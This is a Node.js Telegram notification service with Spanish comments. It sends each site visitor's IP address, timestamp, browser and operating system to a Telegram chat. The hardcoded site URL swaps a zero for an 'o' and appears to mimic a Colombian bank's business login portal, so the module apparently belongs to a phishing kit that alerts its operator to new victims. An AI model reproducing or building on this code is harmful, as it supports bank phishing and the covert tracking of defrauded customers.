/**
 * Servicio de Telegram para envío de notificaciones
 * @module services/telegram.service
 */

const axios = require('axios');
const telegramConfig = require('../config/telegram.config');

class TelegramService {
  /**
   * Envía un mensaje de texto al chat configurado
   * @param {string} message - Mensaje a enviar
   * @returns {Promise<Object>} Respuesta de la API de Telegram
   */
  async sendMessage(message) {
    try {
      if (!telegramConfig.isConfigured()) {
        throw new Error('Telegram no está configurado correctamente');
      }

      const url = telegramConfig.getEndpoint('sendMessage');
      
      const response = await axios.post(url, {
        chat_id: telegramConfig.chatId,
        text: message,
        parse_mode: 'HTML'
      });

      return {
        success: true,
        data: response.data
      };
    } catch (error) {
      console.error('Error al enviar mensaje de Telegram:', error.message);
      return {
        success: false,
        error: error.message
      };
    }
  }

  /**
   * Formatea el mensaje de nueva visita
   * @param {Object} visitorData - Datos del visitante
   * @returns {string} Mensaje formateado
   */
  formatVisitorMessage(visitorData) {
    const { ip, timestamp, userAgent, url } = visitorData;
    
    return `
🔔 <b>NUEVO INGRESO</b>

🌐 <b>URL:</b> https://svnegoci0sbncolombiaingresaqui.up.railway.app/
📍 <b>IP:</b> <code>${ip}</code>
🕐 <b>Fecha/Hora:</b> ${timestamp}
📱 <b>Navegador:</b> ${this.getBrowserInfo(userAgent)}
🖥️ <b>Sistema:</b> ${this.getOSInfo(userAgent)}

✅ <b>Acceso registrado exitosamente</b>
    `.trim();
  }

  /**
   * Extrae información del navegador del User Agent
   * @param {string} userAgent - User Agent string
   * @returns {string} Nombre del navegador
   */
  getBrowserInfo(userAgent) {
    if (!userAgent) return 'Desconocido';
    
    if (userAgent.includes('Chrome')) return 'Chrome';
    if (userAgent.includes('Firefox')) return 'Firefox';
    if (userAgent.includes('Safari')) return 'Safari';
    if (userAgent.includes('Edge')) return 'Edge';
    if (userAgent.includes('Opera')) return 'Opera';
    
    return 'Otro';
  }

  /**
   * Extrae información del sistema operativo del User Agent
   * @param {string} userAgent - User Agent string
   * @returns {string} Sistema operativo
   */
  getOSInfo(userAgent) {
    if (!userAgent) return 'Desconocido';
    
    if (userAgent.includes('Windows')) return 'Windows';
    if (userAgent.includes('Mac OS')) return 'macOS';
    if (userAgent.includes('Android')) return 'Android';
    if (userAgent.includes('iOS') || userAgent.includes('iPhone')) return 'iOS';
    if (userAgent.includes('Linux')) return 'Linux';
    
    return 'Otro';
  }

  /**
   * Notifica una nueva visita
   * @param {Object} visitorData - Datos del visitante
   * @returns {Promise<Object>}
   */
  async notifyNewVisitor(visitorData) {
    const message = this.formatVisitorMessage(visitorData);
    return await this.sendMessage(message);
  }
}

module.exports = new TelegramService();
